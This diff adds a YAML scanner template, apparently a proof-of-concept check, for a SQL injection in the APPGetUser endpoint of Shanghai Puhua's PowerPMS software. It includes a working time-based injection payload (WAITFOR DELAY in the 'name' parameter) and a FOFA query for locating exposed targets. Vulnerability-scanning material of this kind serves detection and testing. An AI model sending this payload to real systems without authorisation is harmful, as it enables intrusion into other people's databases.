@@ -1,0 +1,23 @@
+id: poc-yaml-powerpms-powerpms-appgetuser-sqli
+info:
+  name: 上海普华科技发展股份有限公司PowerPMS接口APPGetUser SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: PowerPMS
+  fofa: app="普华科技-PowerPMS"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /APPAccount/APPGetUser?name=0%27%29%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--+
+  expression: "status_code == 200 && \nduration >= t1 &&\nduration <= t2 &&\ncontains(body,\"\
+    未找到数据\")\n"
+- method: POST
+  path: /APPAccount/APPGetUser?name=0%27%29%3BWAITFOR+DELAY+%270%3A0%3A{{.t3}}%27--+
+  expression: "status_code == 200 && \nduration >= t3 &&\nduration <= t4 &&\ncontains(body,\"\
+    未找到数据\")\n"
+transport: http
